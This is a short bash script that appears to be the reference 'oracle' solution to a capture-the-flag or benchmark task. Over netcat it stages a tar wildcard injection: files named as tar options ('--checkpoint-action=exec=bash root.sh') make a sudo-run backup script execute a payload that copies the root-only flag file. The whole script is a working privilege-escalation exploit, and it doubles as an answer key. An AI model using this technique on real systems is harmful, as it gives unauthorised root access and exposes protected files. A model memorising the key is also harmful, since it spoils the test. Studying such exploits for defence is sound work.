#!/usr/bin/env bash
# Oracle: tar wildcard injection via sudo backup.sh.
set -euo pipefail
box() { echo "$1" | timeout 30 nc box 31337; }
box 'id; sudo -l'
box "cd ~/public && printf '#!/bin/sh\ncat /root/flag > /home/dev/pwned.txt\n' > root.sh && chmod +x root.sh && touch -- '--checkpoint=1' '--checkpoint-action=exec=bash root.sh' file.txt && echo staged"
box 'sudo /usr/local/bin/backup.sh; cat /home/dev/pwned.txt'
